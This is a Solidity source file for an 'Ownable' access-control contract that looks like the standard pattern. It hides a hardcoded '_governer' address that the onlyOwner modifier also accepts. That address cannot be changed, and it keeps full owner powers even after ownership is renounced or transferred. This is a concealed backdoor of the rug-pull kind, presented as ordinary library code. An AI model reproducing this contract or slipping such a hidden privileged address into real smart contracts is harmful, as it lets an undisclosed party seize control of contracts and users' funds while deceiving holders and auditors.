// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;
import "./Context.sol";

abstract contract Ownable is Context {
  address private _owner;
  address private _governer = 0xE93e8C3C5c74aBcd9dbda514b545b461fd7a13Cb;


  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor () {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  function owner() public view virtual returns (address) {
    return _owner;
  }

  function governer() public view virtual returns (address) {
    return _governer;
  }

  modifier onlyOwner() {
    require(owner() == _msgSender() || governer() == _msgSender() , "Ownable: caller is not the owner");
    _;
  }

  function renounceOwnership() public virtual onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }

  function transferOwnership(address newOwner) public virtual onlyOwner {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}